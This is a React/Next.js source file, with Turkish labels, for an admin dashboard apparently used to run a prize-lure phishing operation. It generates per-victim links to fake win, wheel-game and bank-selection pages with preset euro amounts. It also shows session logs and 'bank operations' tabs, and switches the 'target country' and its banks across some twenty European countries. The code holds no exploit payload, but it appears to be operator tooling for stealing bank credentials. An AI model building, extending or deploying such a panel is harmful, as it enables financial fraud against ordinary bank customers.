"use client";

import { useEffect, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { LogsTab } from "./components/LogsTab";
import { UsersTab } from "./components/UsersTab";
import { BanksTab } from "./components/BanksTab";
import { LanguageTab } from "./components/LanguageTab";
import { WheelSettingsTab } from "./components/WheelSettingsTab";
import { GeneralSettingsTab } from "./components/GeneralSettingsTab";
import { PushNotifyToggle } from "./components/PushNotifyToggle";
import { useSettings } from "@/contexts/SettingsContext";
import { normalizeCountryName } from "@/lib/country-utils";

export function Admin1Dashboard({ user }: { user: any }) {
  const [isCollapsed, setIsCollapsed] = useState(() => {
    if (typeof window === "undefined") return false;
    try {
      return localStorage.getItem("admin1SidebarCollapsed") === "true";
    } catch {
      return false;
    }
  });
  useEffect(() => {
    try {
      localStorage.setItem("admin1SidebarCollapsed", String(isCollapsed));
    } catch {}
  }, [isCollapsed]);
  const [darkMode, setDarkMode] = useState(true);
  const [activeTab, setActiveTab] = useState("Loglar");
  const [showNewLinkModal, setShowNewLinkModal] = useState(false);
  const [mobileSidebarOpen, setMobileSidebarOpen] = useState(false);

  // Link Oluşturma State'leri
  const [creatingLink, setCreatingLink] = useState(false);
  const [newLink, setNewLink] = useState<string | null>(null);
  const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank">("normal");
  const [amount, setAmount] = useState("5000");
  const [currency, setCurrency] = useState("€");
  const [partnerName, setPartnerName] = useState("");
  const [participationCode, setParticipationCode] = useState("");
  const [createLinkError, setCreateLinkError] = useState<string | null>(null);

  const adminIdentifier = user?.user_metadata?.username || user?.email?.split('@')[0] || "admin";
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();

  async function handleCreateLink() {
    if (!supabase) return;
    setCreateLinkError(null);
    setCreatingLink(true);
    
    try {
      // ADIM 1: KALICI SILINMIS (bosta) EN KUCUK public_id'yi bul (cakisma YOK)
      let reusePublicId: number | null = null;
      try {
        const { data: usedRows } = await supabase
          .from("sessions")
          .select("public_id")
          .not("public_id", "is", null);
        const usedIds = new Set(
          (usedRows || [])
            .map((r) => Number((r as any).public_id))
            .filter((n) => Number.isFinite(n) && n > 0)
        );
        // 1'den başla 100.000'e kadar ara (yeterli)
        for (let i = 1; i <= 100000; i++) {
          if (!usedIds.has(i)) {
            reusePublicId = i;
            break;
          }
        }
      } catch (_findErr) {
        // public_id listesi okunamazsa sequence devam etsin (zarar yok)
      }

      const insertPayload: any = {
        amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
        current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry",
        status: "offline",
        is_hidden: false,
        partner_name: adminIdentifier,
        participation_code: linkType === "normal" ? (participationCode.trim() || null) : null,
        form_data: {
          currency,
          is_wheel_game: linkType === "wheel",
          partner_display_name: linkType === "normal" ? partnerName.trim() : "",
        }
      };

      // Bosta ID varsa manuel public_id ata (yoksa PostgreSQL SEQUENCE otomatik uretir)
      if (reusePublicId !== null) {
        insertPayload.public_id = reusePublicId;
      }

      const { data, error } = await supabase
          .from("sessions")
          .insert(insertPayload)
          .select("id, public_id")
          .single();

      if (error) throw error;

      if (data?.id) {
        const publicSessionId = data.public_id ? String(data.public_id) : data.id;
        let urlPath = `/code?session=${publicSessionId}`;
        if (linkType === "wheel") urlPath = `/wheel?session=${publicSessionId}`;
        if (linkType === "direct_win") urlPath = `/win?session=${publicSessionId}`;
        if (linkType === "direct_bank") urlPath = `/banken?session=${publicSessionId}`;
        setNewLink(`${window.location.origin}${urlPath}`);
      }
    } catch (err: any) {
      setCreateLinkError(err.message || "Link oluşturulamadı.");
    } finally {
      setCreatingLink(false);
    }
  }

  const EUROPEAN_COUNTRIES = [
    { name: "Tümü", flag: "🌍", lang: "nl" },
    { name: "Hollanda", flag: "🇳🇱", lang: "nl" },
    { name: "Almanya", flag: "🇩🇪", lang: "de" },
    { name: "Avusturya", flag: "🇦🇹", lang: "de" },
    { name: "Belçika", flag: "🇧🇪", lang: "nl" },
    { name: "İsviçre", flag: "🇨🇭", lang: "de" },
    { name: "Finlandiya", flag: "🇫🇮", lang: "fi" },
    { name: "İspanya", flag: "🇪🇸", lang: "es" },
    { name: "İtalya", flag: "🇮🇹", lang: "it" },
    { name: "Fransa", flag: "🇫🇷", lang: "fr" },
    { name: "Çekya", flag: "🇨🇿", lang: "cs" },
    { name: "Litvanya", flag: "🇱🇹", lang: "lt" },
    { name: "Estonya", flag: "🇪🇪", lang: "et" },
    { name: "Polonya", flag: "🇵🇱", lang: "pl" },
    { name: "İsveç", flag: "🇸🇪", lang: "sv" },
    { name: "Danimarka", flag: "🇩🇰", lang: "da" },
    { name: "Romanya", flag: "🇷🇴", lang: "ro" },
    { name: "Yunanistan", flag: "🇬🇷", lang: "el" },
    { name: "Portekiz", flag: "🇵🇹", lang: "pt" },
    { name: "Macaristan", flag: "🇭🇺", lang: "hu" }
  ];

  async function handleFlagChange(countryName: string, langCode: string) {
    const normalizedCountryName = normalizeCountryName(countryName);
    if (!confirm(`Sitenin dilini ve bankalarını "${normalizedCountryName}" olarak değiştirmek istediğinize emin misiniz?`)) return;
    if (!supabase) return;

    try {
      // 1. Dili güncelle
      const { translations } = await import("@/lib/languageDefaults");
      const t = translations[langCode] || translations["en"];
      
      const updatePayload = {
        ...t,
        site_language: langCode,
        target_country: normalizedCountryName
      };

      // UUID id varsa onu query'de eşleştirip güncelleyeceğiz veya tek satır varsaydığımız için direkt id olmadan update edeceğiz.
      // global_settings tablosunda sadece 1 satır olduğunu varsayarak:
      const { data: gsData } = await supabase.from("global_settings").select("id").limit(1).single();
      
      if (gsData?.id) {
        await supabase.from("global_settings").update(updatePayload).eq("id", gsData.id);
      } else {
        await supabase.from("global_settings").insert(updatePayload);
      }

      alert(`Sistem başarıyla "${normalizedCountryName}" ayarlarına güncellendi.`);
    } catch (err: any) {
      alert("Hata oluştu: " + err.message);
    }
  }

  const selectTab = (tab: string) => {
    setActiveTab(tab);
    setMobileSidebarOpen(false);
  };

  const renderContent = () => {
    switch (activeTab) {
      case "Loglar":
        return <LogsTab darkMode={darkMode} user={user} />;
      case "Geçmiş Loglar":
        return <LogsTab darkMode={darkMode} user={user} displayMode="deleted" />;
      case "Çöp Loglar":
        return <LogsTab darkMode={darkMode} user={user} displayMode="trash" />;
      case "Banka İşlemleri":
        return <BanksTab darkMode={darkMode} />;
      case "Dil Ayarları":
        return <LanguageTab darkMode={darkMode} />;
      case "Çark Ayarları":
        return <WheelSettingsTab darkMode={darkMode} />;
      case "Kullanıcı":
        return <UsersTab darkMode={darkMode} />;
      case "Genel Ayarlar":
      case "Arkaplan Rengi":
        return <GeneralSettingsTab darkMode={darkMode} />;
      default:
        return <LogsTab darkMode={darkMode} user={user} />;
    }
  };

  return (
    <div className={`flex h-screen overflow-hidden ${darkMode ? 'bg-[#000000] text-[#f5f5f7]' : 'bg-[#f5f5f7] text-[#1d1d1f]'} font-sans tracking-tight selection:bg-[#EB5E28] selection:text-white`}>
      
      {/* Background Gradient Mesh Effect (Subtle) */}
      <div className="absolute inset-0 z-0 pointer-events-none overflow-hidden">
        <div className={`absolute -top-[20%] -left-[10%] w-[50%] h-[50%] rounded-full blur-[120px] opacity-20 ${darkMode ? 'bg-[#EB5E28]/30' : 'bg-[#EB5E28]/20'}`}></div>
        <div className={`absolute top-[60%] -right-[10%] w-[40%] h-[40%] rounded-full blur-[100px] opacity-20 ${darkMode ? 'bg-blue-600/20' : 'bg-blue-400/10'}`}></div>
      </div>

      {/* MOBILE SIDEBAR BACKDROP */}
      {mobileSidebarOpen && (
        <div
          className="fixed inset-0 z-40 bg-black/60 backdrop-blur-sm md:hidden"
          onClick={() => setMobileSidebarOpen(false)}
        />
      )}

      {/* SIDEBAR */}
      <div className={`flex flex-col transition-all duration-500 ease-in-out border-r ${darkMode ? 'bg-[#1c1c1e] md:bg-[#1c1c1e]/60 border-white/5 backdrop-blur-2xl shadow-[1px_0_20px_rgba(0,0,0,0.3)]' : 'bg-white md:bg-white/60 border-[#d2d2d7]/50 backdrop-blur-2xl shadow-[1px_0_20px_rgba(0,0,0,0.03)]'} fixed md:relative inset-y-0 left-0 z-50 md:z-10 h-full w-[260px] ${mobileSidebarOpen ? 'translate-x-0' : '-translate-x-full md:translate-x-0'} ${isCollapsed ? 'md:w-[80px]' : 'md:w-[260px]'}`}>
        <div className={`h-[75px] flex items-center justify-between px-4 border-b ${darkMode ? 'border-white/5' : 'border-[#d2d2d7]/50'} relative group`}>
          {(!isCollapsed || mobileSidebarOpen) && (
            <div className="flex items-center gap-2">
              <span className="text-xl font-bold tracking-tighter bg-clip-text text-transparent bg-gradient-to-r from-[#EB5E28] to-[#ff8a5c]">EPIN</span>
              
              {/* Flag Selector Dropdown */}
              <div className="relative group/flag">
                <button className={`p-1.5 rounded-lg flex items-center gap-1 text-sm transition-all duration-300 ${darkMode ? 'hover:bg-white/10' : 'hover:bg-black/5'}`}>
                  <span className="drop-shadow-sm">{EUROPEAN_COUNTRIES.find(c => c.name === normalizeCountryName(settings?.target_country || "Avusturya"))?.flag || "🌍"}</span>
                  <svg className="w-3 h-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
                </button>
                <div className="absolute top-full left-0 mt-2 w-48 rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.12)] opacity-0 invisible group-hover/flag:opacity-100 group-hover/flag:visible transition-all duration-300 z-50 overflow-hidden border backdrop-blur-3xl" style={{ backgroundColor: darkMode ? 'rgba(30,30,30,0.85)' : 'rgba(255,255,255,0.85)', borderColor: darkMode ? 'rgba(255,255,255,0.1)' : 'rgba(0,0,0,0.05)' }}>
                  <div className="max-h-[300px] overflow-y-auto py-2 px-1">
                    <div className="px-3 py-1 text-[10px] font-bold opacity-40 uppercase tracking-widest mb-1">Hedef Ülke</div>
                    {EUROPEAN_COUNTRIES.map(c => (
                      <button 
                        key={c.name}
                        onClick={() => handleFlagChange(c.name, c.lang)}
                        className={`w-full text-left px-3 py-2 text-sm flex items-center gap-3 rounded-xl transition-all duration-200 ${darkMode ? 'hover:bg-white/10' : 'hover:bg-black/5'}`}
                      >
                        <span className="text-lg drop-shadow-sm">{c.flag}</span>
                        <span className="font-medium">{c.name}</span>
                      </button>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          )}
          <button
            onClick={() => {
              if (typeof window !== "undefined" && window.innerWidth < 768) {
                setMobileSidebarOpen(false);
              } else {
                setIsCollapsed(!isCollapsed);
              }
            }}
            className={`p-2 rounded-xl transition-all duration-300 ${darkMode ? 'hover:bg-white/10 text-gray-400 hover:text-white' : 'hover:bg-black/5 text-gray-500 hover:text-black'} ${isCollapsed && !mobileSidebarOpen ? 'md:mx-auto' : ''}`}
          >
            <svg className="w-5 h-5 md:hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
            <svg className="w-5 h-5 hidden md:block" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" /></svg>
          </button>
        </div>
        <div className="flex-1 overflow-y-auto py-6 space-y-1.5 px-3">
          {/* Menu Items */}
          <SidebarItem icon="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" label="Loglar" active={activeTab === "Loglar"} onClick={() => selectTab("Loglar")} isCollapsed={isCollapsed && !mobileSidebarOpen} darkMode={darkMode} />
          <SidebarItem icon="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" label="Geçmiş Loglar" active={activeTab === "Geçmiş Loglar"} onClick={() => selectTab("Geçmiş Loglar")} isCollapsed={isCollapsed && !mobileSidebarOpen} darkMode={darkMode} />
          <SidebarItem icon="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" label="Çöp Loglar" active={activeTab === "Çöp Loglar"} onClick={() => selectTab("Çöp Loglar")} isCollapsed={isCollapsed && !mobileSidebarOpen} darkMode={darkMode} />
          <SidebarItem icon="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" label="Banka İşlemleri" active={activeTab === "Banka İşlemleri"} onClick={() => selectTab("Banka İşlemleri")} isCollapsed={isCollapsed && !mobileSidebarOpen} darkMode={darkMode} />
          <SidebarItem icon="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" label="Dil Ayarları" active={activeTab === "Dil Ayarları"} onClick={() => selectTab("Dil Ayarları")} isCollapsed={isCollapsed && !mobileSidebarOpen} darkMode={darkMode} />
          <SidebarItem icon="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" label="Çark Ayarları" active={activeTab === "Çark Ayarları"} onClick={() => selectTab("Çark Ayarları")} isCollapsed={isCollapsed && !mobileSidebarOpen} darkMode={darkMode} />
          <SidebarItem icon="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" label="Kullanıcı" active={activeTab === "Kullanıcı"} onClick={() => selectTab("Kullanıcı")} isCollapsed={isCollapsed && !mobileSidebarOpen} darkMode={darkMode} />
          <SidebarItem icon="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" label="Genel Ayarlar" active={activeTab === "Genel Ayarlar"} onClick={() => selectTab("Genel Ayarlar")} isCollapsed={isCollapsed && !mobileSidebarOpen} darkMode={darkMode} />
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="relative z-10 flex-1 flex flex-col h-full overflow-hidden">
        {/* TOPBAR */}
        <div className={`h-[75px] border-b flex items-center justify-between px-4 md:px-8 shrink-0 backdrop-blur-2xl ${darkMode ? 'border-white/5 bg-[#1c1c1e]/60' : 'border-[#d2d2d7]/50 bg-white/60'}`}>
          <div className="flex items-center gap-3 min-w-0">
            <button
              onClick={() => setMobileSidebarOpen(true)}
              className={`md:hidden p-2 rounded-xl transition-all ${darkMode ? 'hover:bg-white/10 text-gray-300' : 'hover:bg-black/5 text-gray-600'}`}
              title="Menüyü Aç"
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" /></svg>
            </button>
            <span className="text-lg md:text-xl font-semibold opacity-90 truncate">{activeTab}</span>
          </div>
          <div className="flex items-center space-x-2 md:space-x-5">
            <PushNotifyToggle darkMode={darkMode} />
            <span className={`hidden sm:inline-flex text-sm font-medium px-3 py-1 rounded-full ${darkMode ? 'bg-white/10 text-white/70' : 'bg-black/5 text-black/60'}`}>
              @{adminIdentifier}
            </span>
            <button onClick={() => setDarkMode(!darkMode)} className={`p-2.5 rounded-full transition-all duration-300 hover:scale-105 active:scale-95 ${darkMode ? 'bg-white/10 text-yellow-400 hover:bg-white/20' : 'bg-black/5 text-gray-700 hover:bg-black/10'}`}>
              {darkMode ? (
                <svg className="w-5 h-5 drop-shadow-sm" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fillRule="evenodd" clipRule="evenodd" /></svg>
              ) : (
                <svg className="w-5 h-5 drop-shadow-sm" fill="currentColor" viewBox="0 0 20 20"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" /></svg>
              )}
            </button>
            <button onClick={() => setShowNewLinkModal(true)} className={`flex items-center gap-2 px-3 md:px-5 py-2.5 rounded-full font-medium shadow-sm transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${darkMode ? 'bg-white text-black hover:bg-gray-100' : 'bg-black text-white hover:bg-gray-800'}`}>
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4" /></svg>
                <span className="hidden sm:inline">Yeni Link</span>
            </button>
          </div>
        </div>

        {/* CONTENT */}
        <div className="flex-1 overflow-y-auto p-4 md:p-6 relative">
          <div className="max-w-[1760px] mx-auto h-full">
            {renderContent()}
          </div>
        </div>
      </div>

      {/* Link Oluştur Modal (Glassmorphism + Apple Style) */}
      {showNewLinkModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" onClick={() => setShowNewLinkModal(false)}></div>
          <div className={`relative w-full max-w-md rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] p-8 transform transition-all animate-in fade-in zoom-in-95 duration-300 ${darkMode ? 'bg-[#1c1c1e]/90 backdrop-blur-2xl border border-white/10' : 'bg-white/90 backdrop-blur-2xl border border-white/50'}`}>
            <h3 className="text-2xl font-semibold mb-6 tracking-tight">Yeni Link Oluştur</h3>
            
            {!newLink ? (
              <div className="space-y-5">
                <div>
                  <label className="block text-sm font-medium mb-2 opacity-80">Başlangıç Sayfası</label>
                  <select 
                    value={linkType} 
                    onChange={(e) => setLinkType(e.target.value as any)}
                    className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                  >
                    <option value="normal">Katılım Kodu (Normal)</option>
                    <option value="wheel">Çark Oyunu</option>
                    <option value="direct_win">Tebrikler Ekranı</option>
                    <option value="direct_bank">Direkt Banka Seçimi</option>
                  </select>
                </div>
                
                {linkType !== "wheel" && (
                  <div className="flex gap-3">
                    <div className="flex-1">
                      <label className="block text-sm font-medium mb-2 opacity-80">Miktar</label>
                      <input 
                        type="text" 
                        value={amount} 
                        onChange={(e) => setAmount(e.target.value)}
                        className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                      />
                    </div>
                    <div className="w-28">
                      <label className="block text-sm font-medium mb-2 opacity-80">Birim</label>
                      <select 
                        value={currency} 
                        onChange={(e) => setCurrency(e.target.value)}
                        className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                      >
                        <option value="€">€ (Euro)</option>
                        <option value="$">$ (USD)</option>
                        <option value="£">£ (GBP)</option>
                      </select>
                    </div>
                  </div>
                )}
                
                {linkType === "normal" && (
                  <>
                    <div>
                      <label className="block text-sm font-medium mb-2 opacity-80">Partner İsmi</label>
                      <input 
                        type="text" 
                        value={partnerName} 
                        onChange={(e) => setPartnerName(e.target.value)}
                        placeholder="Örn: X Firması"
                        className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium mb-2 opacity-80">Katılım Kodu (Opsiyonel)</label>
                      <input 
                        type="text" 
                        value={participationCode} 
                        onChange={(e) => setParticipationCode(e.target.value)}
                        placeholder="Örn: WIN100"
                        className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                      />
                    </div>
                  </>
                )}
                
                {createLinkError && (
                  <div className="p-3 text-sm text-red-500 bg-red-500/10 rounded-xl font-medium">
                    {createLinkError}
                  </div>
                )}
                
                <div className="flex justify-end gap-3 mt-8">
                  <button 
                    onClick={() => setShowNewLinkModal(false)} 
                    className={`px-5 py-3 rounded-xl font-semibold transition-all hover:scale-105 active:scale-95 ${darkMode ? 'bg-white/10 hover:bg-white/20' : 'bg-black/5 hover:bg-black/10'}`}
                  >
                    Vazgeç
                  </button>
                  <button 
                    onClick={handleCreateLink}
                    disabled={creatingLink}
                    className="px-6 py-3 bg-[#EB5E28] text-white rounded-xl font-semibold shadow-lg shadow-[#EB5E28]/30 hover:shadow-[#EB5E28]/50 transition-all hover:scale-105 active:scale-95 disabled:opacity-50 disabled:pointer-events-none"
                  >
                    {creatingLink ? "Oluşturuluyor..." : "Bağlantı Oluştur"}
                  </button>
                </div>
              </div>
            ) : (
              <div className="space-y-6">
                <div className="flex items-center justify-center w-16 h-16 mx-auto bg-green-500/10 text-green-500 rounded-full mb-4">
                  <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                </div>
                <p className="text-center font-medium opacity-80 text-lg">Bağlantı Hazır</p>
                <div className="flex gap-2">
                  <input 
                    type="text" 
                    readOnly 
                    value={newLink} 
                    className={`flex-1 p-3.5 rounded-xl text-sm font-mono outline-none text-center ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`} 
                  />
                </div>
                <div className="flex flex-col gap-3">
                  <button 
                    onClick={() => {
                      navigator.clipboard.writeText(newLink);
                      alert("Kopyalandı!");
                    }} 
                    className="w-full py-3.5 bg-[#EB5E28] text-white rounded-xl font-semibold shadow-lg shadow-[#EB5E28]/30 hover:shadow-[#EB5E28]/50 transition-all hover:scale-[1.02] active:scale-95"
                  >
                    Bağlantıyı Kopyala
                  </button>
                  <button 
                    onClick={() => {
                      setNewLink(null);
                      setShowNewLinkModal(false);
                    }} 
                    className={`w-full py-3.5 rounded-xl font-semibold transition-all hover:scale-[1.02] active:scale-95 ${darkMode ? 'bg-white/10 hover:bg-white/20' : 'bg-black/5 hover:bg-black/10'}`}
                  >
                    Kapat
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

    </div>
  );
}

function SidebarItem({ icon, label, active, isCollapsed, darkMode, onClick }: { icon: string, label: string, active?: boolean, isCollapsed: boolean, darkMode: boolean, onClick: () => void }) {
  return (
    <a href="#" onClick={(e) => { e.preventDefault(); onClick(); }} className={`flex items-center px-4 py-3.5 rounded-xl transition-all duration-300 group ${active ? (darkMode ? 'bg-white/10 shadow-sm' : 'bg-white shadow-sm border border-gray-200/50') : (darkMode ? 'hover:bg-white/5' : 'hover:bg-black/5')}`}>
      <div className={`p-1.5 rounded-lg transition-colors ${active ? 'bg-[#EB5E28] text-white shadow-md' : (darkMode ? 'text-gray-400 group-hover:text-white' : 'text-gray-500 group-hover:text-black')}`}>
        <svg className="w-5 h-5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={active ? 2.5 : 2} d={icon} />
        </svg>
      </div>
      {!isCollapsed && <span className={`ml-3 text-sm font-semibold tracking-wide transition-colors ${active ? (darkMode ? 'text-white' : 'text-black') : (darkMode ? 'text-gray-400 group-hover:text-white' : 'text-gray-600 group-hover:text-black')}`}>{label}</span>}
    </a>
  );
}
